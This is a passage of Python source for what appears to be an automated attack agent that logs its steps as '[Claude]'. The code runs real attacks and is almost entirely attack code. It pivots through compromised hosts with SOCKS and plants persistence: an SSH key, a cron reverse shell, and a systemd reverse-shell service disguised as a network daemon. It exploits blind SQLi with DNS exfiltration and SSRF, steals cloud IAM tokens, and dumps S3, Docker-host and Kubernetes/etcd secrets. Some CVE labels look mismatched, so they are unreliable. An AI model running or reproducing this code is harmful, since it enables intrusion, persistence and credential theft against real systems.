                lm_out, _ = self._run_cmd(f"lat-move-{h.replace('.','_')}", lm_cmd, target, timeout=25)
                if "pwn3d" in lm_out.lower() or "[+]" in lm_out:
                    self._capture_evidence(lm_out, target, f"lateral-{h}", f"lateral movement to {h}")
                    accumulated_output.append(f"=== Lateral Movement → {h} ===\n{lm_out[:400]}")
                    self._windows_post_exploit(h, u, None if is_hash else p, lm_out, accumulated_output)
                    break

    def _setup_pivot(self, target, user, pwd, accumulated_output):
        """Set up SOCKS5 proxy through compromised Linux host for internal network access."""
        self._log(f"[Claude] PIVOT: configurando SOCKS5 proxy via {target}")
        t_safe = target.replace(".", "_")

        # Upload chisel and start SOCKS5 server
        pivot_out, _ = self._run_cmd(
            "pivot-setup",
            f"# Check if chisel is available locally\n"
            f"CHISEL=$(which chisel 2>/dev/null || find /opt /usr/local/bin /tools -name 'chisel' 2>/dev/null | head -1); "
            f"if [ -n \"$CHISEL\" ]; then "
            f"  # Upload chisel to target\n"
            f"  sshpass -p '{pwd}' scp -o StrictHostKeyChecking=no $CHISEL {user}@{target}:/tmp/chisel_{t_safe} 2>/dev/null; "
            f"  sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{target} "
            f"  'chmod +x /tmp/chisel_{t_safe} && nohup /tmp/chisel_{t_safe} server --socks5 --port 1080 &>/tmp/chisel.log &' 2>/dev/null; "
            f"  sleep 3; "
            f"  # Connect from attacker side\n"
            f"  $CHISEL client {target}:1080 socks &>/tmp/chisel_client.log &"
            f"  echo \"PIVOT_SOCKS5_ACTIVE: {target}:1080 → use proxychains -q\"; "
            f"elif command -v ssh &>/dev/null; then "
            f"  # SSH dynamic port forwarding\n"
            f"  sshpass -p '{pwd}' ssh -f -N -D 1080 -o StrictHostKeyChecking=no "
            f"  -o ConnectTimeout=10 {user}@{target} 2>/dev/null && "
            f"  echo 'PIVOT_SSH_SOCKS5_ACTIVE: 127.0.0.1:1080'; "
            f"fi",
            target, timeout=30,
        )
        if "PIVOT_SOCKS5_ACTIVE" in pivot_out or "PIVOT_SSH_SOCKS5_ACTIVE" in pivot_out:
            self._log(f"[Claude] PIVOT: SOCKS5 activo en 127.0.0.1:1080 — escaneando red interna!")
            accumulated_output.append(f"=== Pivot SOCKS5 {target} ===\n{pivot_out[:300]}")
            # Scan internal network via proxychains
            internal_scan, _ = self._run_cmd(
                "internal-network-scan",
                f"proxychains -q nmap -sT -T3 -p 22,80,443,445,3389,8080 --open "
                f"192.168.0.0/24 192.168.1.0/24 10.0.0.0/24 10.10.10.0/24 172.16.0.0/24 "
                f"2>/dev/null | grep -E 'Nmap scan|open|Host is up' | head -40",
                target, timeout=120,
            )
            if internal_scan.strip():
                accumulated_output.append(f"=== Internal Network via Pivot ===\n{internal_scan[:800]}")
                self._save_findings([{
                    "title": f"Pivoting Activo: Red Interna Accesible via {target}",
                    "severity": "high",
                    "description": f"SOCKS5 proxy via {target} permite acceder a red interna:\n{internal_scan[:400]}",
                    "cve": "",
                }], target)

    def _establish_persistence(self, target, user, pwd, is_root, accumulated_output):
        """Establish persistence on compromised host (authorized_keys, crontab, systemd)."""
        if not is_root and user == "root":
            return
        self._log(f"[Claude] PERSISTENCE: estableciendo persistencia en {target} ({user})")

        def ssh_exec(cmd, label, timeout=20):
            full = (f"sshpass -p '{pwd}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "
                    f"-o BatchMode=no {user}@{target} '{cmd}' 2>/dev/null")
            out, _ = self._run_cmd(label, full, target, timeout=timeout)
            return out

        # Generate SSH key pair for persistence
        key_out, _ = self._run_cmd(
            "gen-ssh-key",
            f"[ -f /tmp/pentest_rsa ] || ssh-keygen -t rsa -b 2048 -N '' -f /tmp/pentest_rsa 2>/dev/null; "
            f"cat /tmp/pentest_rsa.pub 2>/dev/null",
            target, timeout=15,
        )
        pub_key = key_out.strip()
        if pub_key and pub_key.startswith("ssh-"):
            ssh_exec(
                f"mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
                f"echo '{pub_key}' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && "
                f"echo PERSISTENCE_SSH_KEY_ADDED",
                "persist-ssh-key",
            )

        # Crontab backdoor (if root)
        if is_root:
            ssh_exec(
                f"(crontab -l 2>/dev/null; echo '*/5 * * * * bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1') | crontab - && "
                f"echo PERSISTENCE_CRON_ADDED",
                "persist-cron",
            )
            # systemd service
            ssh_exec(
                f"cat > /etc/systemd/system/systemd-netd.service << 'SVCEOF'\n"
                f"[Unit]\nDescription=Network Manager Daemon\nAfter=network.target\n"
                f"[Service]\nType=simple\nRestart=always\nRestartSec=5\n"
                f"ExecStart=/bin/bash -c 'bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1'\n"
                f"[Install]\nWantedBy=multi-user.target\nSVCEOF\n"
                f"systemctl daemon-reload && systemctl enable systemd-netd && systemctl start systemd-netd && "
                f"echo PERSISTENCE_SYSTEMD_ADDED",
                "persist-systemd", timeout=15,
            )

        self._save_findings([{
            "title": f"Persistencia Establecida en {target} ({user})",
            "severity": "critical",
            "description": f"Mecanismos de persistencia instalados: SSH authorized_keys"
                           f"{', crontab reverse shell, systemd service' if is_root else ''}.",
            "cve": "",
        }], target)
        accumulated_output.append(f"=== Persistencia {target} ===\n✓ SSH key + {'crontab + systemd' if is_root else 'user-level backdoor'}")

    # ═════════════════════════════════════════════════════════════════════════
    # TIER 1 — Advanced offensive capabilities
    # ═════════════════════════════════════════════════════════════════════════

    # ── F1: Advanced web exploits (SQLi OOB, SSRF→AWS, smuggling, IDOR, OAuth2) ──
    def _advanced_web_exploits(self, target, open_ports, accumulated_output):
        """Blind SQLi OOB, SSRF→AWS metadata, HTTP smuggling, IDOR, OAuth2 misconfig."""
        http_ports = [p for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80, 443, 8080, 8443, 8888, 3000, 5000)]
        if not http_ports:
            return
        self._log(f"[Claude] F1-ADVWEB: SQLi OOB + SSRF + Smuggling + IDOR + OAuth2 → {target}")

        for p in http_ports[:2]:
            proto = "https" if p["port"] in (443, 8443) else "http"
            base_url = f"{proto}://{target}:{p['port']}"

            # ── F1a: Blind SQLi time-based + OOB DNS exfil ───────────────
            self._log(f"[Claude] F1a: Blind SQLi time-based → {base_url}")
            sqli_out, _ = self._run_cmd(
                f"sqli-oob-{p['port']}",
                # time-based blind on common params
                f"sqlmap -u '{base_url}/?id=1' --batch --level=3 --risk=2 "
                f"--technique=BT --time-sec=5 --dbms=auto "
                f"--random-agent --output-dir=/tmp/sqlmap_{target.replace('.','_')} "
                f"2>/dev/null | tail -20; "
                # OOB via DNS (requires burp collaborator or interactsh)
                f"IHOST=$(curl -sL --max-time 5 'https://api.interactsh.com/register' "
                f"2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); "
                f"print(d.get(\"url\",\"\"))' 2>/dev/null); "
                f"[ -n \"$IHOST\" ] && "
                f"curl -sL --max-time 8 '{base_url}/?id=1 AND LOAD_FILE(CONCAT(0x5c5c5c5c,"
                f"(SELECT version()),0x2e,$IHOST,0x5c5c))' 2>/dev/null | head -3",
                target, timeout=120,
            )
            if sqli_out.strip():
                accumulated_output.append(f"=== SQLi OOB {base_url} ===\n{sqli_out[:600]}")
                if re.search(r'Parameter.*injectable|sqlmap identified|Type: time-based', sqli_out, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"SQL Injection (Blind Time-Based) @ {base_url}",
                        "severity": "critical",
                        "description": f"sqlmap detectó inyección SQL blind en {base_url}.\n{sqli_out[:300]}",
                        "cve": "",
                    }], target)

            # ── F1b: SSRF → AWS/GCP/Azure metadata ───────────────────────
            self._log(f"[Claude] F1b: SSRF → Cloud metadata → {base_url}")
            ssrf_payloads = [
                ("http://169.254.169.254/latest/meta-data/", "AWS"),
                ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM"),
                ("http://metadata.google.internal/computeMetadata/v1/?recursive=true", "GCP"),
                ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure"),
                ("http://100.100.100.200/latest/meta-data/", "Alibaba"),
                ("http://192.168.0.1/", "Internal"),
                ("file:///etc/passwd", "LFI via SSRF"),
            ]
            ssrf_params = ["url", "redirect", "next", "target", "dest", "destination",
                           "path", "uri", "link", "proxy", "callback", "fetch", "load",
                           "host", "site", "page", "src", "source", "imageurl", "image"]
            for ssrf_payload, ssrf_type in ssrf_payloads[:4]:
                for ssrf_param in ssrf_params[:5]:
                    ssrf_out, _ = self._run_cmd(
                        f"ssrf-{ssrf_type.replace(' ','-')}-{ssrf_param}",
                        f"curl -sL --max-time 6 -A 'Mozilla/5.0' "
                        f"'{base_url}/?{ssrf_param}={ssrf_payload}' 2>/dev/null | head -15; "
                        f"curl -sL --max-time 6 -A 'Mozilla/5.0' "
                        f"-X POST '{base_url}/api/v1/fetch' "
                        f"-d '{ssrf_param}={ssrf_payload}' 2>/dev/null | head -15",
                        target, timeout=20,
                    )
                    if re.search(r'ami-id|instance-id|iam.*role|project-id|subscription|computeMetadata|root:x:0', ssrf_out, re.IGNORECASE):
                        self._log(f"[Claude] F1b: SSRF → {ssrf_type} confirmado!")
                        # Try to get IAM credentials
                        iam_creds = ""
                        if "AWS" in ssrf_type:
                            role_match = re.search(r'[\w\-]+', ssrf_out)
                            if role_match:
                                iam_out, _ = self._run_cmd(
                                    "ssrf-aws-iam-creds",
                                    f"curl -sL --max-time 8 '{base_url}/?{ssrf_param}="
                                    f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_match.group()}' 2>/dev/null | head -20",
                                    target, timeout=15,
                                )
                                if "AccessKeyId" in iam_out:
                                    iam_creds = f"\nAWS IAM Credentials leaked:\n{iam_out[:400]}"
                        self._save_findings([{
                            "title": f"SSRF → {ssrf_type} Metadata Leak @ {base_url}",
                            "severity": "critical",
                            "description": f"SSRF via param '{ssrf_param}' → {ssrf_type} metadata accessible.\n{ssrf_out[:300]}{iam_creds}",
                            "cve": "CVE-2021-26855" if "Azure" in ssrf_type else "",
                        }], target)
                        accumulated_output.append(f"=== SSRF {ssrf_type} ===\n{ssrf_out[:400]}{iam_creds}")
                        break

            # ── F1c: HTTP Request Smuggling ───────────────────────────────
            self._log(f"[Claude] F1c: HTTP Request Smuggling → {base_url}")
            smug_out, _ = self._run_cmd(
                f"http-smuggling-{p['port']}",
                f"python3 -c \"\nimport socket,ssl,time\n"
                f"h='{target}';port={p['port']}\n"
                f"# CL-TE smuggle probe\n"
                f"req=b'POST / HTTP/1.1\\r\\n"
                f"Host: {target}\\r\\nContent-Length: 6\\r\\n"
                f"Transfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX'\n"
                f"try:\n"
                f"  s=socket.create_connection((h,port),timeout=5)\n"
                f"  if port in (443,8443): s=ssl.wrap_socket(s)\n"
                f"  s.send(req);time.sleep(2);r=s.recv(4096).decode('utf-8','ignore')\n"
                f"  print(r[:200])\nexcept Exception as e: print(f'ERR:{{e}}')\n\" 2>/dev/null; "
                f"# Also try smuggler.py\n"
                f"python3 /opt/smuggler/smuggler.py -u '{base_url}/' "
                f"--log /tmp/smuggler_{target.replace('.','_')}.log 2>/dev/null | head -15; "
                f"cat /tmp/smuggler_{target.replace('.','_')}.log 2>/dev/null | head -10",
                target, timeout=30,
            )
            if re.search(r'smuggl|CL\.TE|TE\.CL|desync|Issue found|vulnerable', smug_out, re.IGNORECASE):
                self._save_findings([{
                    "title": f"HTTP Request Smuggling @ {base_url}",
                    "severity": "high",
                    "description": f"HTTP request desync detectado en {base_url}.\n{smug_out[:300]}",
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== HTTP Smuggling {base_url} ===\n{smug_out[:400]}")

            # ── F1d: IDOR bruteforce ──────────────────────────────────────
            self._log(f"[Claude] F1d: IDOR bruteforce → {base_url}")
            # Discover endpoints first, then test numeric ID variation
            idor_crawl, _ = self._run_cmd(
                f"idor-crawl-{p['port']}",
                f"curl -sL --max-time 10 '{base_url}/' 2>/dev/null | "
                f"grep -oP '(?:href|src|action)=[\"\\x27][^\"\\x27]+[\"\\x27]' | "
                f"grep -oP '[\"\\x27][^\"\\x27]+[\"\\x27]' | tr -d '\"\\x27' | "
                f"grep -E '/[a-z].*(\\?|/)[a-z]*[0-9]+' | head -10",
                target, timeout=15,
            )
            idor_endpoints = re.findall(r'(/[^\s<>"\']+(?:\?|/)\w*\d+[^\s<>"\']*)', idor_crawl)
            for ep in idor_endpoints[:3]:
                base_ep = re.sub(r'\d+', '{}', ep)
                orig_id = re.search(r'\d+', ep)
                if not orig_id:
                    continue
                oid = int(orig_id.group())
                idor_hits = []
                for test_id in [oid - 2, oid - 1, oid + 1, oid + 2, 1, 2, 3, 100, 999]:
                    test_ep = base_ep.format(test_id)
                    idor_out, _ = self._run_cmd(
                        f"idor-test-{test_id}",
                        f"curl -sL --max-time 5 -o /dev/null -w '%{{http_code}} %{{size_download}}' "
                        f"'{base_url}{test_ep}' 2>/dev/null",
                        target, timeout=10,
                    )
                    code_match = re.search(r'^(\d{3}) (\d+)', idor_out)
                    if code_match and code_match.group(1) == "200" and int(code_match.group(2)) > 50:
                        idor_hits.append(f"{test_ep} → {idor_out.strip()}")
                if len(idor_hits) > 2:
                    self._save_findings([{
                        "title": f"IDOR (Insecure Direct Object Reference) @ {base_url}{base_ep}",
                        "severity": "high",
                        "description": f"Acceso a objetos de otros usuarios sin autorización:\n" + "\n".join(idor_hits[:5]),
                        "cve": "",
                    }], target)

            # ── F1e: OAuth2 misconfig detection ──────────────────────────
            self._log(f"[Claude] F1e: OAuth2 misconfig → {base_url}")
            oauth_paths = [
                "/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                "/.well-known/openid-configuration", "/oauth/token",
                "/api/oauth/callback", "/login/oauth",
            ]
            for oauth_path in oauth_paths:
                oauth_out, _ = self._run_cmd(
                    f"oauth-{oauth_path.replace('/','_')[:20]}",
                    f"curl -sL --max-time 8 -D - "
                    f"'{base_url}{oauth_path}?response_type=token"
                    f"&client_id=test&redirect_uri=http://evil.com&state=x' 2>/dev/null | head -30; "
                    f"curl -sL --max-time 8 "
                    f"'{base_url}{oauth_path}?response_type=code"
                    f"&client_id=test&redirect_uri=javascript:alert(1)' 2>/dev/null | head -10",
                    target, timeout=15,
                )
                if re.search(r'access_token|id_token|code=|token_type|implicit|Bearer', oauth_out, re.IGNORECASE):
                    issues = []
                    if "evil.com" in oauth_out or "redirect_uri" in oauth_out.lower():
                        issues.append("Open redirect en OAuth2 — token leakage posible")
                    if "javascript:" in oauth_out.lower():
                        issues.append("OAuth2 redirect_uri acepta javascript: — XSS via OAuth")
                    if re.search(r'access_token=.{10,}', oauth_out):
                        issues.append("Token expuesto directamente en respuesta (implicit flow)")
                    if issues:
                        self._save_findings([{
                            "title": f"OAuth2 Misconfiguration @ {base_url}{oauth_path}",
                            "severity": "high",
                            "description": "\n".join(issues) + f"\n\nResponse:\n{oauth_out[:300]}",
                            "cve": "",
                        }], target)
                    break

    # ── F2: Cloud attack surface (AWS/Azure/GCP/S3/Terraform) ─────────────
    def _cloud_attack(self, target, open_ports, accumulated_output):
        """S3 bucket enum, AWS/GCP/Azure metadata, Terraform state, IAM escalation."""
        import socket
        self._log(f"[Claude] F2-CLOUD: AWS/Azure/GCP attack surface → {target}")

        # Derive apex domain for bucket guessing
        try:
            parts = target.rstrip(".").split(".")
            apex = ".".join(parts[-2:]) if len(parts) >= 2 else target
            apex_nodot = apex.replace(".", "-").replace("_", "-")
            company = parts[0] if parts else target
        except Exception:
            apex = target; apex_nodot = target; company = target

        # ── F2a: S3 bucket enumeration ────────────────────────────────────
        self._log(f"[Claude] F2a: S3 bucket enum → {apex}")
        bucket_names = [
            apex_nodot, company, f"{company}-backup", f"{company}-data",
            f"{company}-prod", f"{company}-dev", f"{company}-staging",
            f"{company}-assets", f"{company}-static", f"{company}-files",
            f"backup-{company}", f"dev-{company}", f"prod-{company}",
            f"{company}-logs", f"{company}-config", f"{company}-secrets",
        ]
        for bname in bucket_names:
            s3_out, _ = self._run_cmd(
                f"s3-enum-{bname[:30]}",
                f"aws s3 ls s3://{bname} --no-sign-request 2>&1 | head -10; "
                f"curl -sL --max-time 5 'https://{bname}.s3.amazonaws.com/' 2>/dev/null | head -10; "
                f"curl -sL --max-time 5 'https://s3.amazonaws.com/{bname}/' 2>/dev/null | head -10",
                target, timeout=20,
            )
            if re.search(r'PRE |[0-9]{4}-[0-9]{2}-[0-9]{2}.*[0-9]+|ListBucketResult', s3_out):
                # Bucket is public — list contents
                ls_out, _ = self._run_cmd(
                    f"s3-list-{bname[:30]}",
                    f"aws s3 ls s3://{bname} --no-sign-request --recursive 2>/dev/null | "
                    f"grep -iE '\\.(env|sql|bak|key|pem|config|conf|cfg|json|yaml|xml|csv|tar|zip)' | head -20; "
                    f"# Download sensitive files\n"
                    f"aws s3 cp s3://{bname}/.env /tmp/s3_{bname[:20]}.env --no-sign-request 2>/dev/null; "
                    f"aws s3 cp s3://{bname}/backup.sql /tmp/s3_{bname[:20]}.sql --no-sign-request 2>/dev/null; "
                    f"cat /tmp/s3_{bname[:20]}.env 2>/dev/null | head -20",
                    target, timeout=30,
                )
                sensitive_files = re.findall(r'[^\s]+\.(?:env|sql|bak|key|pem|config|conf|cfg)', ls_out, re.IGNORECASE)
                self._save_findings([{
                    "title": f"S3 Bucket Público Expuesto: s3://{bname}",
                    "severity": "critical",
                    "description": (
                        f"Bucket S3 '{bname}' accesible públicamente sin autenticación.\n"
                        f"Archivos sensibles: {', '.join(sensitive_files[:8]) or 'ver listado'}\n"
                        f"Listado:\n{ls_out[:400]}"
                    ),
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== S3 Public {bname} ===\n{ls_out[:600]}")

        # ── F2b: AWS metadata via SSRF (also try direct if on EC2) ───────
        self._log(f"[Claude] F2b: AWS metadata direct check → {target}")
        aws_meta, _ = self._run_cmd(
            "aws-metadata-direct",
            # Try direct metadata endpoint (works if attacker is on same EC2 or SSRF)
            f"curl -sL --max-time 5 'http://169.254.169.254/latest/meta-data/' 2>/dev/null; "
            f"curl -sL --max-time 5 --header 'X-aws-ec2-metadata-token-ttl-seconds: 21600' "
            f"-X PUT 'http://169.254.169.254/latest/api/token' 2>/dev/null > /tmp/imdsv2_token.txt; "
            f"TOKEN=$(cat /tmp/imdsv2_token.txt 2>/dev/null); "
            f"[ -n \"$TOKEN\" ] && curl -sL --max-time 5 "
            f"-H \"X-aws-ec2-metadata-token: $TOKEN\" "
            f"'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null; "
            f"# Check instance metadata service\n"
            f"curl -sL --max-time 5 'http://169.254.169.254/latest/dynamic/instance-identity/document' 2>/dev/null | head -20",
            target, timeout=20,
        )
        if re.search(r'ami-id|instance-id|instanceType|accountId|region', aws_meta, re.IGNORECASE):
            # Try to get IAM role credentials
            role_out, _ = self._run_cmd(
                "aws-iam-role-creds",
                f"ROLE=$(curl -sL --max-time 5 "
                f"'http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>/dev/null | head -1); "
                f"[ -n \"$ROLE\" ] && curl -sL --max-time 5 "
                f"\"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE\" 2>/dev/null | "
                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
                f"print(f\"AccessKeyId: {{d.get(chr(65)+chr(99)+chr(99)+chr(101)+chr(115)+chr(115)+chr(75)+chr(101)+chr(121)+chr(73)+chr(100))}}\"); "
                f"print(f\"SecretAccessKey: {{d.get(chr(83)+chr(101)+chr(99)+chr(114)+chr(101)+chr(116)+chr(65)+chr(99)+chr(99)+chr(101)+chr(115)+chr(115)+chr(75)+chr(101)+chr(121))}}\"); "
                f"print(f\"Token: {{d.get(chr(84)+chr(111)+chr(107)+chr(101)+chr(110))[:30]}}\")' 2>/dev/null",
                target, timeout=15,
            )
            self._save_findings([{
                "title": f"AWS EC2 Metadata Service Accessible → IAM Credentials Exposed",
                "severity": "critical",
                "description": f"EC2 IMDS accesible.\nInstance info:\n{aws_meta[:300]}\n{role_out[:200]}",
                "cve": "CVE-2019-0232",
            }], target)
            accumulated_output.append(f"=== AWS IMDS ===\n{aws_meta[:400]}\n{role_out[:300]}")

        # ── F2c: Azure metadata + managed identity ────────────────────────
        azure_meta, _ = self._run_cmd(
            "azure-metadata",
            f"curl -sL --max-time 5 "
            f"-H 'Metadata: true' "
            f"'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>/dev/null | head -20; "
            f"# Managed identity token\n"
            f"curl -sL --max-time 5 "
            f"-H 'Metadata: true' "
            f"'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
            f"&resource=https://management.azure.com/' 2>/dev/null | head -10",
            target, timeout=15,
        )
        if re.search(r'subscriptionId|resourceGroupName|access_token.*eyJ', azure_meta, re.IGNORECASE):
            self._save_findings([{
                "title": f"Azure IMDS → Managed Identity Token Exposed",
                "severity": "critical",
                "description": f"Azure Instance Metadata Service accesible. Token de identidad obtenido.\n{azure_meta[:400]}",
                "cve": "",
            }], target)

        # ── F2d: GCP metadata ─────────────────────────────────────────────
        gcp_meta, _ = self._run_cmd(
            "gcp-metadata",
            f"curl -sL --max-time 5 "
            f"-H 'Metadata-Flavor: Google' "
            f"'http://metadata.google.internal/computeMetadata/v1/instance/' 2>/dev/null | head -10; "
            f"curl -sL --max-time 5 "
            f"-H 'Metadata-Flavor: Google' "
            f"'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' 2>/dev/null | head -5",
            target, timeout=15,
        )
        if re.search(r'project-id|service-accounts|access_token|token_type', gcp_meta, re.IGNORECASE):
            self._save_findings([{
                "title": f"GCP Metadata Server → Service Account Token Exposed",
                "severity": "critical",
                "description": f"GCP Compute Engine metadata accessible.\n{gcp_meta[:300]}",
                "cve": "",
            }], target)

        # ── F2e: Terraform state file exposure ────────────────────────────
        self._log(f"[Claude] F2e: Terraform state exposure → {target}")
        tf_paths = [
            "/terraform.tfstate", "/terraform/terraform.tfstate",
            "/.terraform/terraform.tfstate", "/infra/terraform.tfstate",
            "/deploy/terraform.tfstate", "/tf/terraform.tfstate",
        ]
        http_ports = [p for p in open_ports if p["port"] in (80, 443, 8080, 8443)]
        for hp in http_ports[:1]:
            proto = "https" if hp["port"] in (443, 8443) else "http"
            for tf_path in tf_paths:
                tf_out, _ = self._run_cmd(
                    f"tf-state-{tf_path.replace('/', '_')[:20]}",
                    f"curl -sL --max-time 8 -o /dev/null -w '%{{http_code}} %{{content_type}}' "
                    f"'{proto}://{target}:{hp['port']}{tf_path}' 2>/dev/null; "
                    f"curl -sL --max-time 8 "
                    f"'{proto}://{target}:{hp['port']}{tf_path}' 2>/dev/null | "
                    f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
                    f"resources=[r.get(\"type\") for r in d.get(\"resources\",[])]; "
                    f"print(f\"Resources: {{\",\".join(set(resources[:10]))}}\"); "
                    f"# Extract secrets\n"
                    f"text=str(d);\n"
                    f"import re; secrets=re.findall(r\\\"(?:password|secret|key|token).*?:\\\\\"([^\\\"]+)\\\"\\\", text, re.I);\n"
                    f"print(f\\\"Secrets found: {{secrets[:5]}}\\\")' 2>/dev/null | head -10",
                    target, timeout=15,
                )
                if re.search(r'Resources:|Secrets found:|aws_instance|azurerm|google_', tf_out, re.IGNORECASE):
                    self._save_findings([{
                        "title": f"Terraform State File Exposed @ {proto}://{target}:{hp['port']}{tf_path}",
                        "severity": "critical",
                        "description": f"Terraform state file accesible públicamente — contiene infraestructura y posibles secretos.\n{tf_out[:400]}",
                        "cve": "",
                    }], target)
                    break

    # ── F3: Container escape & Kubernetes attacks ──────────────────────────
    def _container_k8s_escape(self, target, open_ports, accumulated_output):
        """Docker privileged escape, K8s API anon, etcd dump, service account abuse."""
        self._log(f"[Claude] F3-CONTAINER/K8s: Docker escape + Kubernetes → {target}")
        port_set = {p["port"] for p in open_ports}

        # ── F3a: Docker API exposed (port 2375/2376) ──────────────────────
        docker_ports = [p for p in [2375, 2376, 2377] if p in port_set]
        for dp in docker_ports:
            proto = "https" if dp in (2376, 2377) else "http"
            self._log(f"[Claude] F3a: Docker API → {target}:{dp}")
            docker_out, _ = self._run_cmd(
                f"docker-api-{dp}",
                f"curl -sL --max-time 8 '{proto}://{target}:{dp}/v1.41/info' 2>/dev/null | "
                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
                f"print(f\"Docker {d.get(chr(83)+chr(101)+chr(114)+chr(118)+chr(101)+chr(114)+chr(86)+chr(101)+chr(114)+chr(115)+chr(105)+chr(111)+chr(110))}: OS={d.get(chr(79)+chr(83)+chr(84)+chr(121)+chr(112)+chr(101))}, Containers={d.get(chr(67)+chr(111)+chr(110)+chr(116)+chr(97)+chr(105)+chr(110)+chr(101)+chr(114)+chr(115))}\")' 2>/dev/null; "
                f"curl -sL --max-time 8 '{proto}://{target}:{dp}/v1.41/containers/json' 2>/dev/null | "
                f"python3 -c 'import sys,json; cs=json.load(sys.stdin); "
                f"[print(f\"Container: {{c.get(chr(78)+chr(97)+chr(109)+chr(101)+chr(115),[\"\"])[0]}} Image={{c.get(chr(73)+chr(109)+chr(97)+chr(103)+chr(101))}}\") for c in cs[:5]]' 2>/dev/null",
                target, timeout=20,
            )
            if re.search(r'Docker|Container|ServerVersion|Containers:', docker_out, re.IGNORECASE):
                accumulated_output.append(f"=== Docker API Exposed {target}:{dp} ===\n{docker_out[:500]}")
                # Escape: create privileged container that mounts host root
                escape_out, _ = self._run_cmd(
                    f"docker-escape-{dp}",
                    f"docker -H {proto}://{target}:{dp} run --rm --privileged "
                    f"-v /:/mnt/host alpine:latest sh -c "
                    f"'cat /mnt/host/etc/shadow 2>/dev/null | head -5; "
                    f"cat /mnt/host/root/.ssh/id_rsa 2>/dev/null | head -5; "
                    f"cat /mnt/host/root/root.txt 2>/dev/null; "
                    f"echo \"DOCKER_ESCAPE_SUCCESS: $(cat /mnt/host/etc/hostname)\"' 2>/dev/null | head -20",
                    target, timeout=60,
                )
                if "DOCKER_ESCAPE_SUCCESS" in escape_out or re.search(r'root:.*:\d+:\d+:', escape_out):
                    self._save_findings([{
                        "title": f"Docker API RCE → Host Escape @ {target}:{dp}",
                        "severity": "critical",
                        "description": f"Docker API expuesto sin autenticación → contenedor privilegiado → root del host.\n{escape_out[:400]}",
                        "cve": "CVE-2019-5736",
                    }], target)
                else:
                    self._save_findings([{
                        "title": f"Docker API Expuesto sin Auth @ {target}:{dp}",
                        "severity": "critical",
                        "description": f"Docker daemon API accesible sin autenticación en {target}:{dp}.\n{docker_out[:300]}",
                        "cve": "",
                    }], target)

        # ── F3b: Kubernetes API server (6443/8080) ─────────────────────────
        k8s_ports = [p for p in [6443, 8080, 8443, 10250, 10255, 2379] if p in port_set]
        for kp in k8s_ports:
            self._log(f"[Claude] F3b: Kubernetes API → {target}:{kp}")
            proto = "https" if kp in (6443, 8443, 10250) else "http"
            k8s_out, _ = self._run_cmd(
                f"k8s-api-{kp}",
                f"curl -sLk --max-time 8 '{proto}://{target}:{kp}/api/v1/namespaces' 2>/dev/null | head -20; "
                f"curl -sLk --max-time 8 '{proto}://{target}:{kp}/api/v1/secrets' 2>/dev/null | head -20; "
                f"curl -sLk --max-time 8 '{proto}://{target}:{kp}/api/v1/pods' 2>/dev/null | "
                f"python3 -c 'import sys,json; d=json.load(sys.stdin); "
                f"pods=[i.get(\"metadata\",{{}}).get(\"name\") for i in d.get(\"items\",[])]; "
                f"print(f\"Pods: {{\", \".join(str(p) for p in pods[:8])}}\")' 2>/dev/null",
                target, timeout=20,
            )
            if re.search(r'namespace|kube-system|default|Pod|items|kind.*List', k8s_out, re.IGNORECASE):
                accumulated_output.append(f"=== K8s API {target}:{kp} ===\n{k8s_out[:600]}")
                # Try to exec into a pod
                pod_names = re.findall(r'(?:name|Name).*?([a-z][a-z0-9\-]+)', k8s_out)
                if pod_names:
                    exec_out, _ = self._run_cmd(
                        "k8s-pod-exec",
                        f"curl -sLk --max-time 15 "
                        f"'{proto}://{target}:{kp}/api/v1/namespaces/default/pods/{pod_names[0]}/exec"
                        f"?command=id&command=hostname&stdin=false&stdout=true&tty=false' 2>/dev/null | head -10; "
                        f"kubectl --server={proto}://{target}:{kp} --insecure-skip-tls-verify "
                        f"exec {pod_names[0]} -- id 2>/dev/null | head -5",
                        target, timeout=15,
                    )
                    if "uid=" in exec_out:
                        self._save_findings([{
                            "title": f"Kubernetes Unauthenticated RCE via Pod Exec @ {target}:{kp}",
                            "severity": "critical",
                            "description": f"K8s API anónimo permite exec en pods.\nPod: {pod_names[0]}\n{exec_out[:300]}",
                            "cve": "",
                        }], target)
                    else:
                        self._save_findings([{
                            "title": f"Kubernetes API Unauthenticated — Secret/Pod Listing @ {target}:{kp}",
                            "severity": "critical",
                            "description": f"K8s API accesible sin autenticación en {target}:{kp}.\n{k8s_out[:400]}",
                            "cve": "",
                        }], target)

        # ── F3c: etcd no-auth (port 2379) ─────────────────────────────────
        if 2379 in port_set:
            self._log(f"[Claude] F3c: etcd no-auth → {target}:2379")
            etcd_out, _ = self._run_cmd(
                "etcd-noauth",
                f"curl -sL --max-time 10 "
                f"'http://{target}:2379/v2/keys/?recursive=true' 2>/dev/null | "
                f"python3 -c 'import sys,json,re; t=sys.stdin.read(); "
                f"secrets=re.findall(r\\\"(?:token|password|secret|key|cert)[\\\"\\s:]+[\\\"\\']([^\\\"\\x27{{}}]+)[\\\"\\x27]\\\", t, re.I); "
                f"print(f\\\"etcd secrets: {{secrets[:5]}}\\\"); print(t[:500])' 2>/dev/null | head -20; "
                f"# v3 API\n"
